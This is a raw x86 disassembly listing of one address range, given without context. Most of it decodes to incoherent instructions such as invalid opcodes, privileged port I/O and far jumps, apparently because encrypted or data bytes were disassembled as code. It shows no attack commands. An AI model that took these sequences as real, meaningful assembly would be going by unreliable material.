  406717:	loopne 0x4066ee
  406719:	ds cwde 
  40671b:	loop   0x4066fd
  40671d:	cmp    ebx,eax
  40671f:	sti    
  406720:	pop    esi
  406721:	dec    edi
  406722:	mov    eax,ds:0xb075efea
  406727:	sub    eax,0x1a05673f
  40672c:	jg     0x406723
  40672e:	xor    esi,0xb4f47ea3
  406734:	add    cl,cl
  406736:	sbb    BYTE PTR [ebx+0x30bb9bac],0x79
  40673d:	add    eax,0x509fb240
  406742:	xchg   esi,eax
  406743:	jo     0x40670d
  406745:	je     0x4067c2
  406747:	sub    cl,BYTE PTR [edx]
  406749:	lock mov edi,ds
  40674c:	push   ds
  40674d:	(bad)  
  40674e:	sbb    esp,DWORD PTR [eax+0x611abee6]
  406754:	jg     0x4067ca
  406756:	call   0xa25a:0xe7adc0d3
  40675d:	punpckhwd mm0,QWORD PTR [ebp+0x58]
  406761:	mov    DWORD PTR [edi+0x47],esp
  406764:	add    eax,0xec02a5eb
  406769:	mov    eax,ds:0xaf2a5daa
  40676e:	xlat   BYTE PTR ds:[ebx]
  40676f:	fiadd  DWORD PTR [ecx+0x14]
  406772:	pop    es
  406773:	dec    ecx
  406774:	repnz arpl WORD PTR [ecx-0x4d],sp
  406778:	fadd   DWORD PTR [edx]
  40677a:	imul   edi,DWORD PTR [ebx],0xffffffa3
  40677d:	xchg   DWORD PTR ds:0xfd20aa76,eax
  406783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406784:	fdivp  st(4),st
  406786:	push   ebp
  406787:	sbb    eax,0x6d9b08a
  40678c:	sbb    DWORD PTR [edi-0x19],eax
  40678f:	adc    al,0x6d
  406791:	ret    
  406792:	push   esp
  406793:	mov    edi,0xd287e22a
  406798:	das    
  406799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40679a:	data16 add BYTE PTR [edx],0x17
  40679e:	or     BYTE PTR [ecx],bl
  4067a0:	mov    ds:0xe16b565f,eax
  4067a5:	lods   eax,DWORD PTR ds:[esi]
  4067a6:	push   ecx
  4067a7:	pop    edx
  4067a8:	mov    DWORD PTR [esi],edx
  4067aa:	fisttp QWORD PTR [edx+0x59ff9e]
  4067b0:	fisubr DWORD PTR [ebx+ecx*8]
  4067b3:	mov    ah,0x52
  4067b5:	push   ebx
  4067b6:	push   ss
  4067b7:	dec    edx
  4067b8:	or     DWORD PTR [esi+0x74],edx
  4067bb:	sub    dh,BYTE PTR [edi]
  4067bd:	fs dec ecx
  4067bf:	sbb    eax,0x5eda86b7
  4067c4:	and    DWORD PTR [eax-0x6c277f16],edx
  4067ca:	sub    al,0x63
  4067cc:	push   esi
  4067cd:	mov    al,ds:0xb16ae559
  4067d2:	jmp    0x8bb54ffb
  4067d7:	jo     0x4067ae
  4067d9:	or     dl,ah
  4067db:	repnz pop ds
  4067dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067de:	cmp    BYTE PTR [eax-0x49],bl
  4067e1:	pop    edx
  4067e2:	loop   0x406764
  4067e4:	mov    edx,ebp
  4067e6:	in     al,dx
  4067e7:	nop
  4067e8:	dec    ebp
  4067e9:	mov    ch,0x54
  4067eb:	sbb    DWORD PTR [ebx-0x66],edi
  4067ee:	xchg   BYTE PTR [eax],ch
  4067f0:	jbe    0x406808
  4067f2:	adc    eax,0xff8816a3
  4067f7:	call   0x7c3:0x3c36dba2
  4067fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067ff:	mov    ds:0xf1ad4187,eax
  406804:	pop    ebx
  406805:	inc    esi
  406806:	jno    0x4067b3
  406808:	add    al,0x35
  40680a:	pop    edi
  40680b:	(bad)  
  40680c:	div    DWORD PTR [ebx+0x7]
  40680f:	stos   DWORD PTR es:[edi],eax
  406810:	rcl    BYTE PTR [edi],0x7e
  406813:	pop    ds
  406814:	sub    eax,0xefd4de96
  406819:	mov    ds:0xe6760b36,al
  40681e:	dec    ebx
  40681f:	aaa    
  406820:	cmp    DWORD PTR [edi+0x78f74cee],0xd97a228f
  40682a:	ficomp DWORD PTR [edx]
  40682c:	dec    ebp
  40682d:	out    0xd4,al
  40682f:	and    al,0x33
  406831:	cli    
  406832:	fimul  DWORD PTR [edx-0x6cdb6f8d]
  406838:	pusha  
  406839:	and    ah,BYTE PTR [eax+0x6b]
  40683c:	daa    
  40683d:	sub    dh,bh
  40683f:	div    BYTE PTR [esi-0x1f]
  406842:	ja     0x406886
  406844:	and    BYTE PTR fs:[edi],0xdf
  406848:	in     eax,0xbf
  40684a:	cwde   
  40684b:	mov    edx,0x3fc3fdfe
  406850:	add    al,0x68
  406852:	jno    0x4068ce
  406854:	push   es
  406855:	inc    edi
  406856:	mov    ebx,0x34c3f03c
  40685b:	mov    edi,0xdc44574c
  406860:	adc    bh,ch
  406862:	add    eax,0x4e74b789
  406867:	lock pop ds
  406869:	cwde   
  40686a:	mov    ch,0x0
  40686c:	pop    ss
  40686d:	lahf   
  40686e:	int3   
  40686f:	adc    ebx,ebx
  406871:	rcl    BYTE PTR [ebp+0x48e53260],0x1e
  406878:	cli    
  406879:	aam    0xe
  40687b:	jl     0x406801
  40687d:	repz enter 0x3ee0,0x69
  406882:	loopne 0x4068b8
  406884:	sbb    DWORD PTR [eax-0x6d],edx
  406887:	ins    DWORD PTR es:[edi],dx
  406888:	cdq    
  406889:	mov    ebp,0xada136d5
  40688e:	mov    edx,ecx
  406890:	and    DWORD PTR [edx-0xc],0x89610bba
  406897:	or     al,0x9f
  406899:	mov    dl,0xc
  40689b:	cli    
  40689c:	arpl   WORD PTR [esi],cx
  40689e:	mov    al,0x5e
  4068a0:	ds leave 
  4068a2:	shl    BYTE PTR [edi],1
  4068a4:	pop    ebx
  4068a5:	xchg   DWORD PTR [ebp-0x48],ecx
  4068a8:	mov    DWORD PTR [ebx+0x4e],edi
  4068ab:	jne    0x4068ac
  4068ad:	aad    0x5f
  4068af:	cdq    
  4068b0:	cmp    BYTE PTR [ebp-0x20],bl
  4068b3:	xor    edi,DWORD PTR [edx]
  4068b5:	std    
  4068b6:	js     0x406841
  4068b8:	inc    eax
  4068b9:	shr    ecx,cl
  4068bb:	xchg   ecx,eax
  4068bc:	xchg   edi,eax
  4068bd:	push   esp
  4068be:	and    ebp,0x3f
  4068c1:	outs   dx,BYTE PTR ds:[esi]
  4068c2:	mov    ebp,0xa54b0b57
  4068c7:	jge    0x406920
  4068c9:	mov    ecx,ecx
  4068cb:	icebp  
  4068cc:	je     0x406861
  4068ce:	inc    esp
  4068cf:	push   ebp
  4068d0:	out    0xf6,eax
  4068d2:	sbb    BYTE PTR [ecx+0x49],ch
  4068d5:	or     ebp,edx
  4068d7:	out    0xce,eax
  4068d9:	cli    
  4068da:	js     0x4068da
  4068dc:	call   0x716e7f43
  4068e1:	or     dh,cl
  4068e3:	push   esi
  4068e4:	enter  0xc592,0xbe
  4068e8:	xor    esi,ebx
  4068ea:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4068ec:	aaa    
  4068ed:	dec    edi
  4068ee:	jae    0x406925
  4068f0:	hlt    
  4068f1:	and    esp,DWORD PTR [eax+edx*2+0x1c829272]
  4068f8:	add    dh,ah
  4068fa:	sbb    dh,ah
  4068fc:	sub    BYTE PTR [ecx-0x411568eb],ah
  406902:	pop    ebx
  406903:	repnz sub BYTE PTR [ebx],0x52
  406907:	push   ecx
  406908:	xor    BYTE PTR [ebx+0x69823fdb],ah
  40690e:	cld    
  40690f:	(bad)  
  406910:	iret   
  406911:	mov    esp,0x7cff5da7
  406916:	mov    al,0x46
  406918:	test   bl,ah
  40691a:	jg     0x4068b2
  40691c:	cs das 
  40691e:	(bad)  
  40691f:	ds xchg edi,eax
  406921:	repnz add BYTE PTR [ebp-0x68],ah
  406925:	xchg   esi,eax
  406926:	not    eax
  406928:	pop    ss
  406929:	cld    
  40692a:	repnz cmp BYTE PTR [edx+0x4b],al
  40692e:	aaa    
  40692f:	sti    
  406930:	pop    esp
  406931:	jecxz  0x4068ba
  406933:	mov    esi,0xf6396acc
  406938:	pop    ebx
  406939:	jle    0x406954
  40693b:	jge    0x406970
  40693d:	daa    
  40693e:	imul   BYTE PTR [ebx]
  406940:	push   ds
  406941:	in     eax,0xc9
  406943:	outs   dx,BYTE PTR ds:[esi]
  406944:	xchg   ebp,eax
  406945:	sbb    dh,BYTE PTR [ecx+0x5e]
  406948:	jb     0x40697c
  40694a:	mov    ds:0x11c86a3d,al
  40694f:	int3   
  406950:	or     ecx,ebx
  406952:	mov    ebx,0x1140cb66
  406957:	xor    BYTE PTR [esi-0x1ca13342],ah
  40695d:	inc    esp
  40695e:	mov    dh,BYTE PTR [edx+0x3eafffd3]
  406964:	int    0x91
  406966:	or     esp,edi
  406968:	mov    DWORD PTR [ecx+0x6325de63],edx
  40696e:	pop    edi
  40696f:	fldcw  WORD PTR [edi+0x5ba6bd0e]
  406975:	shr    eax,0xd0
  406978:	ret    
  406979:	push   ss
  40697a:	dec    edx
  40697b:	mov    al,0x11
  40697d:	adc    ch,BYTE PTR [edx+0x6c5832ed]
  406983:	dec    esi
  406984:	pushf  
  406985:	arpl   WORD PTR [eax-0x29],ax
  406988:	mov    BYTE PTR [eax+0x17],cl
  40698b:	fdivr  QWORD PTR [esp+edx*1+0x7851237b]
  406992:	daa    
  406993:	lods   eax,DWORD PTR ds:[esi]
  406994:	ds pop edi
  406996:	(bad)  
  406997:	sbb    eax,0x86b1cf03
  40699c:	jecxz  0x4069ef
  40699e:	push   0xffffffb5
  4069a0:	ret    0x2779
  4069a3:	ret    0x9fb0
  4069a6:	daa    
  4069a7:	lods   eax,DWORD PTR ds:[esi]
  4069a8:	outs   dx,BYTE PTR ds:[esi]
  4069a9:	sbb    bh,bl
  4069ab:	dec    eax
  4069ac:	inc    ebp
  4069ad:	fdivr  QWORD PTR [edx]
  4069af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069b0:	add    eax,0x98431250
  4069b5:	es mov cl,0x4e
  4069b8:	push   esp
  4069b9:	gs xor al,0x70
  4069bc:	mov    ?,WORD PTR [edi-0x2dcd42d8]
  4069c2:	mov    DWORD PTR [ecx],eax
  4069c4:	mov    eax,DWORD PTR [ebp-0x24]
  4069c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4069ca:	xor    eax,esi
  4069cc:	add    eax,edi
  4069ce:	mov    DWORD PTR [ecx+0x4],eax
  4069d1:	mov    eax,DWORD PTR [ebp-0x2c]
  4069d4:	mov    ecx,DWORD PTR [ebp-0x8]
  4069d7:	mov    DWORD PTR [ecx+0x8],eax
  4069da:	mov    eax,DWORD PTR [ebp-0x30]
  4069dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4069e0:	jmp    0x406eeb
  4069e5:	ror    dh,1
  4069e7:	rol    edi,1
  4069e9:	fxch   st(3)
  4069eb:	fcmove st,st(5)
  4069ed:	xor    cl,BYTE PTR [esi-0x1e]
  4069f0:	rcr    DWORD PTR [esi-0x2c],1
  4069f3:	fwait
  4069f4:	inc    eax
  4069f5:	dec    edx
  4069f6:	int    0x78
  4069f8:	js     0x406a64
  4069fa:	jl     0x406a74
  4069fc:	js     0x406a00
  4069fe:	es ret 
  406a00:	les    ebp,FWORD PTR [eax+0xb]
  406a03:	ficomp WORD PTR [ecx+0x47]
  406a06:	outs   dx,BYTE PTR ds:[esi]
  406a07:	or     eax,0x10dbe9d
  406a0c:	int3   
  406a0d:	jnp    0x4069d9
  406a0f:	mov    eax,tr3
  406a12:	(bad)  
  406a13:	cwde   
  406a14:	adc    al,0x55
  406a16:	stc    
  406a17:	ss icebp 
  406a19:	adc    eax,0x50bff2d3
  406a1e:	push   es
  406a1f:	pop    ds
  406a20:	xchg   ebx,eax
  406a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a22:	sahf   
  406a23:	cmp    DWORD PTR [edi-0x195f133c],0xffffffa3
  406a2a:	adc    edi,edx
  406a2c:	or     DWORD PTR [edi],esi
  406a2e:	mov    cl,0xac
  406a30:	add    eax,DWORD PTR [eax]
  406a32:	icebp  
  406a33:	inc    esi
  406a34:	rcl    DWORD PTR [esi-0x5b],cl
  406a37:	into   
  406a38:	(bad)  
  406a39:	js     0x4069cb
  406a3b:	scas   eax,DWORD PTR es:[edi]
  406a3c:	mov    al,ds:0x4681f41a
  406a41:	lods   eax,DWORD PTR ds:[esi]
  406a42:	lock xor eax,0x27e96370
  406a48:	ds ss xor al,0xb5
  406a4c:	or     esi,DWORD PTR [edi+0x61]
  406a4f:	scas   al,BYTE PTR es:[edi]
  406a50:	cmp    bh,dh
  406a52:	shl    dl,cl
  406a54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a55:	mov    dl,0xa6
  406a57:	int    0x4a
  406a59:	imul   edi,edx,0xea96f8dd
  406a5f:	or     ecx,DWORD PTR [edx]
  406a61:	cmp    esp,DWORD PTR [edx+0x35]
  406a64:	or     edi,DWORD PTR [edx+0x73efb74d]
  406a6a:	add    dh,BYTE PTR [esi+edi*1]
  406a6d:	jbe    0x406a08
  406a6f:	xchg   edx,ebx
  406a71:	(bad)  
  406a72:	pop    esp
  406a73:	add    dh,bl
  406a75:	pop    es
  406a76:	jnp    0x406aa6
  406a78:	dec    ebx
  406a79:	loopne 0x406ab6
  406a7b:	retf   
  406a7c:	dec    edx
  406a7d:	cli    
  406a7e:	xchg   BYTE PTR fs:[eax-0x307c8230],ah
  406a85:	push   0xd9070f61
  406a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a8b:	jo     0x406a42
  406a8d:	scas   eax,DWORD PTR es:[edi]
  406a8e:	add    eax,0xdd41b21f
  406a93:	sbb    BYTE PTR [ebp-0x21eb346],dl
  406a99:	push   ebx
  406a9a:	dec    esp
  406a9b:	lea    ecx,[ecx+0x5e8ecbb6]
  406aa1:	push   edx
  406aa2:	adc    esp,edi
  406aa4:	add    al,0x24
  406aa6:	je     0x406a63
  406aa8:	sbb    eax,0xd9a3a97
  406aad:	dec    esi
  406aae:	retf   0xfd2f
  406ab1:	rcl    BYTE PTR [ebx+0x30],1
  406ab4:	mov    ah,0xd2
  406ab6:	sbb    esp,DWORD PTR [esi]
  406ab8:	pop    edi
  406ab9:	add    DWORD PTR ds:0x23eedce,ecx
  406abf:	outs   dx,BYTE PTR ds:[esi]
  406ac0:	out    0xd8,eax
  406ac2:	xchg   edx,eax
  406ac3:	icebp  
  406ac4:	sbb    ah,bl
  406ac6:	mov    bh,0xcc
  406ac8:	jecxz  0x406ad6
  406aca:	rcl    BYTE PTR [eax+0x3bd381f0],1
  406ad0:	xor    al,0xc1
  406ad2:	mov    ecx,DWORD PTR [edi-0x14]
  406ad5:	adc    eax,esi
  406ad7:	pop    esi
  406ad8:	or     DWORD PTR [ecx+0x63cf7880],ebp
  406ade:	daa    
  406adf:	dec    edi
  406ae0:	call   FWORD PTR [eax-0x46b58683]
  406ae6:	mov    edx,ss
  406ae8:	push   ebx
  406ae9:	and    eax,0x931df453
  406aee:	and    eax,0xfd4822c8
  406af3:	aad    0x6
  406af5:	fcmovne st,st(7)
  406af7:	or     edi,DWORD PTR [edx-0x61]
  406afa:	mov    al,ds:0x9a0724a0
  406aff:	sub    ebp,DWORD PTR [eax-0x4879f564]
  406b05:	mov    ah,0x7d
  406b07:	pop    ecx
  406b08:	int3   
  406b09:	in     al,dx
  406b0a:	push   edi
  406b0b:	outs   dx,DWORD PTR ds:[esi]
  406b0c:	jbe    0x406b47
  406b0e:	cdq    
  406b0f:	sub    ebx,0xcd69a30e
  406b15:	popf   
  406b16:	xor    al,0xfa
  406b18:	xchg   BYTE PTR [edx-0x2c],al
  406b1b:	gs xchg ecx,eax
  406b1d:	repz sbb al,0xbf
  406b20:	add    BYTE PTR [ebx-0x2b],dl
  406b23:	cwde   
  406b24:	pop    edi
  406b25:	xchg   ebp,eax
  406b26:	stos   BYTE PTR es:[edi],al
  406b27:	or     BYTE PTR [ebp+0x48957315],dl
  406b2d:	pop    eax
  406b2e:	(bad)  
  406b2f:	jb     0x406b58
  406b31:	das    
  406b32:	ja     0x406b82
  406b34:	inc    eax
  406b35:	mov    edx,0x9c2bef33
  406b3a:	js     0x406bb1
  406b3c:	out    0x90,eax
  406b3e:	xchg   ecx,eax
  406b3f:	push   eax
  406b40:	cwde   
  406b41:	xchg   esp,eax
  406b42:	push   ebx
  406b43:	dec    esi
  406b44:	pop    es
  406b45:	xor    al,0xfd
  406b47:	leave  
  406b48:	cmp    eax,edi
  406b4a:	(bad)  
  406b4b:	sti    
  406b4c:	pop    ebx
  406b4d:	int    0x53
  406b4f:	int3   
  406b50:	imul   edi,DWORD PTR ds:[esi-0x3a522357],0xd6d5bdd3
  406b5b:	in     al,0xf6
  406b5d:	aad    0x82
  406b5f:	xor    al,BYTE PTR [ecx]
  406b61:	scas   ax,WORD PTR es:[edi]
  406b63:	cld    
  406b64:	push   ecx
  406b65:	ss inc ebp
  406b67:	mov    cl,0x62
  406b69:	pop    es
  406b6a:	mov    BYTE PTR [eax],dh
  406b6c:	sub    edx,DWORD PTR [ecx-0x3a0ced25]
  406b72:	pusha  
  406b73:	loope  0x406b4d
  406b75:	xor    bh,BYTE PTR [edx-0x1e]
  406b78:	jno    0x406b10
  406b7a:	push   ebx
  406b7b:	enter  0x760e,0x2f
  406b7f:	outs   dx,DWORD PTR ds:[esi]
  406b80:	add    ch,BYTE PTR [ebx+edx*8]
  406b83:	dec    esp
  406b84:	pop    edx
  406b85:	call   0x5b1d:0xeb2e9241
  406b8c:	jb     0x406b30
  406b8e:	xchg   edx,eax
  406b8f:	lods   eax,DWORD PTR ds:[esi]
  406b90:	inc    esi
  406b92:	pop    ebx
  406b93:	divps  xmm7,XMMWORD PTR [ebp-0x613040e6]
  406b9a:	pop    ebx
  406b9b:	jmp    0x406c03
  406b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b9e:	stos   BYTE PTR es:[edi],al
  406b9f:	xchg   edx,eax
  406ba0:	lods   al,BYTE PTR ds:[esi]
  406ba1:	or     bh,ah
  406ba3:	nop
  406ba4:	push   ebx
  406ba5:	lea    esp,[edi-0x29]
  406ba8:	(bad)  
  406ba9:	aaa    
  406baa:	repz sbb eax,0xb4d0f3fa
  406bb0:	mov    ah,0xa1
  406bb2:	fadd   st,st(5)
  406bb4:	pop    esp
  406bb5:	jmp    0x93b9:0xa3354aa8
  406bbc:	(bad)  
  406bbd:	std    
  406bbe:	xchg   ebx,eax
  406bbf:	lock pusha 
  406bc1:	dec    ecx
  406bc2:	out    dx,eax
  406bc3:	(bad)  
  406bc4:	int3   
  406bc5:	xor    ebp,DWORD PTR [ebx-0x6ee009ee]
  406bcb:	mov    ds:0xa02905fc,al
  406bd0:	cli    
  406bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bd2:	and    BYTE PTR [edx+esi*4+0x68023d69],bl
  406bd9:	cs pop edx
  406bdb:	das    
  406bdc:	sub    al,0x74
  406bde:	popa   
  406bdf:	out    dx,eax
  406be0:	in     eax,0xcf
  406be2:	lock mov dh,0xea
  406be5:	jo     0x406b77
  406be7:	xlat   BYTE PTR ds:[ebx]
  406be8:	inc    ecx
  406be9:	mov    edx,0x4b4e7ea0
  406bee:	out    dx,al
  406bef:	data16 cli 
  406bf1:	mov    esi,0x52403366
  406bf6:	jns    0x406bdd
  406bf8:	mov    ecx,0x1217ae39
  406bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bfe:	loop   0x406b98
  406c00:	xchg   ecx,eax
  406c02:	cmp    esp,DWORD PTR [ebp+eiz*1-0x2d]
  406c06:	pop    edx
  406c07:	outs   dx,DWORD PTR ds:[esi]
  406c09:	loope  0x406be0
  406c0b:	fs push esi
  406c0d:	mov    ebx,0xf756ae38
  406c12:	pop    edi
  406c13:	leave  
  406c14:	(bad)  
  406c15:	xchg   ebp,eax
  406c16:	sbb    eax,0x67119e63
  406c1b:	mov    dh,0x91
  406c1d:	pusha  
  406c1e:	pop    ebx
  406c1f:	and    edi,ecx
  406c21:	cli    
  406c22:	gs xchg edx,eax
  406c24:	xchg   ecx,eax
  406c25:	jae    0x406c4b
  406c27:	pop    eax
  406c28:	ds hlt 
  406c2a:	jl     0x406c03
  406c2c:	sbb    al,0x7b
  406c2e:	adc    bl,bh
  406c30:	sub    BYTE PTR [ebp-0xb29c76c],bl
  406c36:	push   ds
  406c37:	add    eax,DWORD PTR [edi+ebp*8+0x2dad3e43]
  406c3e:	(bad)  
  406c3f:	scas   al,BYTE PTR es:[edi]
  406c40:	dec    ebx
  406c41:	cs fs cli 
  406c44:	mov    ch,0xa4
  406c46:	cdq    
  406c47:	adc    eax,0x601bb6c3
  406c4c:	leave  
  406c4d:	jnp    0x406c9d
  406c4f:	clc    
  406c50:	(bad)  
  406c51:	jmp    0x5e5c:0xd44df8a0
  406c58:	jns    0x406c63
  406c5a:	xchg   DWORD PTR [edx],ecx
  406c5c:	mov    esp,es
  406c5e:	js     0x406c4f
  406c60:	das    
  406c61:	(bad)  
  406c62:	ror    BYTE PTR [ecx+0x20eb4baa],1
  406c68:	mov    ah,BYTE PTR [edx]
  406c6a:	dec    ebx
  406c6b:	jnp    0x406cc6
  406c6d:	inc    edi
  406c6e:	cmc    
  406c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c70:	dec    esp
  406c71:	aad    0x92
  406c73:	sub    dl,BYTE PTR [ebx-0x70494775]
  406c79:	mov    ebx,0x967409f1
  406c7e:	and    cl,BYTE PTR [edi]
  406c80:	mov    ch,0xab
  406c82:	in     eax,dx
  406c83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c84:	mov    eax,ds:0xb3e9da8d
  406c89:	xor    BYTE PTR [eax-0x43],cl
  406c8c:	lods   eax,DWORD PTR ds:[esi]
  406c8d:	or     bh,BYTE PTR [eax]
  406c8f:	and    BYTE PTR [ebx+0x33b697b6],0xe1
  406c96:	std    
  406c97:	mov    eax,ds:0x6ced2e48
  406c9c:	sub    eax,0xf1567f90
  406ca1:	outs   dx,DWORD PTR ds:[esi]
  406ca2:	xchg   DWORD PTR [esi-0x61],esp
  406ca5:	imul   ebx,ebx,0x46
  406ca8:	mov    ecx,0x8383a67d
  406cad:	cld    
  406cae:	ss int 0x3a
  406cb1:	and    DWORD PTR [edx],esp
  406cb3:	fisttp QWORD PTR [ecx+0x73c8e903]
  406cb9:	leave  
  406cba:	cmp    DWORD PTR ds:0x37ce971,ebx
  406cc0:	popf   
  406cc1:	les    eax,FWORD PTR [esi-0x1]
  406cc4:	push   ds
  406cc5:	pusha  
  406cc6:	arpl   WORD PTR [ebp+0x2d8c1ea0],si
  406ccc:	cdq    
  406ccd:	sti    
  406cce:	mov    DWORD PTR [edx+0x2936e433],ecx
  406cd4:	inc    ecx
  406cd5:	nop
  406cd6:	call   0xcd21:0xddfe7f28
  406cdd:	sahf   
  406cde:	pusha  
  406cdf:	push   ds
  406ce0:	add    DWORD PTR [edx+0x34],edx
  406ce3:	std    
  406ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce5:	xlat   BYTE PTR ds:[ebx]
  406ce6:	hlt    
  406ce7:	xchg   esp,eax
  406ce8:	cmp    DWORD PTR [ebx+0xd],edx
  406ceb:	mov    cl,0xe
  406ced:	das    
  406cee:	loopne 0x406d2b
  406cf0:	xor    edx,ebx
  406cf2:	mov    ds:0x14117569,al
  406cf7:	xor    eax,DWORD PTR [eax-0x6d]
  406cfa:	fmulp  st(1),st
  406cfc:	loopne 0x406cd4
  406cfe:	sbb    al,0x48
  406d00:	pop    eax
  406d01:	mov    ds:0xbb9f92c7,eax
  406d06:	push   0x18ab404a
  406d0b:	jl     0x406d38
  406d0d:	cmp    eax,0x4bc0fbf2
  406d12:	cmp    ecx,DWORD PTR ds:0x436b53a0
  406d18:	cmp    dl,BYTE PTR [ebx-0x24]
  406d1b:	fst    DWORD PTR cs:[eax-0x10]
  406d1f:	add    eax,0x55ba7560
  406d24:	ret    0xb0e4
  406d27:	jae    0x406d0b
  406d29:	pop    edx
  406d2a:	and    esi,edi
  406d2c:	push   0x39334da
  406d31:	fist   WORD PTR [edx+0x8]
  406d34:	adc    BYTE PTR [esp+esi*4+0x27],ah
  406d38:	push   es
  406d39:	lods   eax,DWORD PTR ds:[esi]
  406d3a:	in     al,0x82
  406d3c:	xor    BYTE PTR [ecx-0x60],0x89
  406d40:	stos   BYTE PTR es:[edi],al
  406d41:	clc    
  406d42:	mov    esp,0xa3eacc24
  406d47:	in     eax,dx
  406d48:	jge    0x406d7b
  406d4a:	mov    edi,0x9495143a
  406d4f:	cwde   
  406d50:	ret    
  406d51:	out    dx,eax
  406d52:	or     eax,0x4c00e3c9
  406d57:	outs   dx,DWORD PTR ds:[esi]
  406d58:	or     eax,0x785bad68
  406d5d:	sub    eax,0xf80ac68f
  406d62:	outs   dx,BYTE PTR ds:[esi]
  406d63:	xor    eax,0x1970854f
  406d68:	xchg   esi,eax
  406d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d6a:	mov    ebp,DWORD PTR [esi+0x45]
  406d6d:	dec    edx
  406d6e:	push   ecx
  406d6f:	fisub  WORD PTR ds:0x654cc9c6
  406d75:	enter  0xdb2c,0x2a
  406d79:	push   ds
  406d7a:	bswap  ebp
  406d7c:	jnp    0x406d01
  406d7e:	add    dl,BYTE PTR [edx+0x4f]
  406d81:	mov    ebp,0x5b6c3eaf
  406d86:	jecxz  0x406d57
  406d88:	sbb    dl,BYTE PTR [ebx+0x19]
  406d8b:	mov    ecx,0x227cad7b
  406d90:	leave  
  406d91:	or     DWORD PTR [esi+0x34],edx
  406d94:	nop
  406d95:	sub    eax,0x4e5fe582
  406d9a:	xor    esi,DWORD PTR [bx+si]
  406d9d:	sbb    al,cl
  406d9f:	sbb    al,0x91
  406da1:	jbe    0x406d4c
  406da3:	(bad)  
  406da4:	out    0xd1,eax
  406da6:	test   BYTE PTR ds:0x48b109b9,bl
  406dac:	cwde   
  406dad:	imul   esp,DWORD PTR [edx+ecx*2-0x3664cf1b],0x89893fca
  406db8:	pop    edx
  406db9:	jg     0x406d8a
  406dbb:	inc    ebp
  406dbc:	ret    
  406dbd:	pop    edi
  406dbe:	(bad)  
  406dbf:	sti    
  406dc0:	nop
  406dc1:	(bad)  
  406dc2:	retf   
  406dc3:	gs pushf 
  406dc5:	or     esi,DWORD PTR [edx]
  406dc7:	or     esi,ebp
  406dc9:	ja     0x406da3
  406dcb:	inc    edx
  406dcc:	jle    0x406e48
  406dce:	dec    edi
  406dcf:	sar    BYTE PTR [ebx],1
  406dd1:	nop
  406dd2:	adc    BYTE PTR [edx+0x6b],dh
  406dd5:	or     ecx,DWORD PTR ss:[esi]
  406dd8:	mov    es,WORD PTR [esi-0x1e]
  406ddb:	int3   
  406ddc:	out    dx,al
  406ddd:	mov    al,ds:0xbf7f0a4f
  406de2:	xchg   ebx,eax
  406de3:	popf   
  406de4:	pop    ecx
  406de5:	test   BYTE PTR [edx+0x11e2f23e],bh
  406deb:	pop    ebx
  406dec:	cmp    ecx,DWORD PTR [edi+0x6f63dd4a]
  406df2:	stc    
  406df3:	and    BYTE PTR [ebx-0x61ca5fa7],dl
  406df9:	xchg   DWORD PTR [esi-0x5e5307bd],eax
  406dff:	sub    ebp,DWORD PTR [edi+0x45]
  406e02:	ja     0x406e26
  406e04:	add    cl,BYTE PTR [eax+0x59]
  406e07:	pop    esp
  406e08:	jne    0x406e7c
  406e0a:	in     al,dx
  406e0b:	jns    0x406daa
  406e0d:	jne    0x406dc3
  406e0f:	repnz popf 
  406e11:	xor    BYTE PTR [ecx+0x53],0x34
  406e15:	rcr    esp,1
  406e17:	xlat   BYTE PTR ds:[ebx]
  406e18:	push   ebp
  406e19:	stos   BYTE PTR es:[edi],al
  406e1a:	and    al,BYTE PTR [edx+0x2d]
  406e1d:	sub    DWORD PTR [edi-0x32],ecx
  406e20:	inc    ebx
  406e21:	push   ebp
  406e22:	pop    esi
  406e23:	xor    al,0x37
  406e25:	and    al,0x8b
  406e27:	cdq    
  406e28:	aad    0xb5
  406e2a:	add    BYTE PTR [ecx+0x2f],cl
  406e2d:	in     eax,0x44
  406e2f:	jg     0x406e38
  406e31:	cmp    DWORD PTR [esi+0x67417682],esi
  406e37:	jnp    0x406df0
  406e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e3a:	jle    0x406e6c
  406e3c:	inc    edi
  406e3d:	ret    
  406e3e:	inc    ecx
  406e3f:	and    DWORD PTR [eax+0x60],0xffffffb1
  406e43:	gs pop ecx
  406e45:	cmp    eax,0x24dfdcf7
  406e4a:	into   
  406e4b:	mov    eax,ds:0x51f1f62
  406e50:	and    ch,BYTE PTR [ebx+esi*1-0x4ce5dac8]
  406e57:	sub    edx,ebp
  406e59:	stos   DWORD PTR es:[edi],eax
  406e5a:	call   0x4fb:0xf3d380f6
  406e61:	adc    ah,bh
  406e63:	mov    ch,0xd9
  406e65:	mov    cl,0xfc
  406e67:	rol    BYTE PTR [ecx+0x3c],0xd7
  406e6b:	and    BYTE PTR [ecx+0x1a9aaac6],al
  406e71:	gs fs pop ss
  406e74:	mov    BYTE PTR [ebp-0x80],ch
  406e77:	mov    cl,0x57
  406e79:	pop    ebx
  406e7a:	aam    0xab
  406e7c:	add    al,0xdb
  406e7e:	pop    ebx
  406e7f:	shr    DWORD PTR [ebp+ebp*8+0x7e],1
  406e83:	xor    esp,DWORD PTR [ecx+0x28]
  406e86:	ja     0x406ec7
  406e88:	inc    ecx
  406e89:	cmp    edx,eax
  406e8b:	cli    
  406e8c:	sbb    edi,ebp
  406e8e:	inc    esi
  406e8f:	das    
